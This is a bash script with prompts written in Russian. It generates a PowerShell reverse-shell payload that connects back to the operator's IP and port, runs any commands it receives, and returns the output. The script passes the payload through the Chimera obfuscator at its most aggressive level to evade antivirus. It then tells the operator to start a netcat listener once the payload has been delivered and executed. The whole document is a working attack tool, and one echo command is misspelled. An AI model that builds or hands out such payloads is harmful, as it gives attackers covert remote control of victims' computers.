#!/bin/bash

LHOST=$(ip addr show wlan0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n 1 || ip addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n 1)

echo "[+] Твой локальный IP: $LHOST"
echo "[?] Введите порт для Reverse Shell (напр. 4444):"
read LPORT

# 2. Создаем временный ps1 файл с простым Reverse Shell
# Это классический однострочник, который Chimera потом "размажет"
RAW_FILE="raw_shell.ps1"
cat <<EOF > $RAW_FILE
\$client = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);
\$stream = \$client.GetStream();
[byte[]]\$bytes = 0..65535|%{0};
while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){
    \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);
    \$sendback = (iex \$data 2>&1 | Out-String );
    \$sendback2  = \$sendback + 'PS ' + (pwd).Path + '> ';
    \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);
    \$stream.Write(\$sendbyte,0,\$sendbyte.Length);
    \$stream.Flush()
};
\$client.Close()
EOF

echo "[*] Файл $RAW_FILE создан."

OUTPUT_FILE="crypt_shell.ps1"

echo "[*] Запуск Chimera (Level: Insane)..."
bash chimera.sh --file $RAW_FILE --all --level 5 --prepend --output $OUTPUT_FILE

if [ $? -eq 0 ]; then
    echo "========================================"
    echo "[+] ГОТОВО! Пейлоад: $OUTPUT_FILE"
    echl "ты можешь запустить nc -lvp [твой порт] после доставки и исполнения"
    echo "========================================"
    rm $RAW_FILE
else
    echo "[-] Ошибка при работе Chimera. Проверь путь к бинарнику."
fi
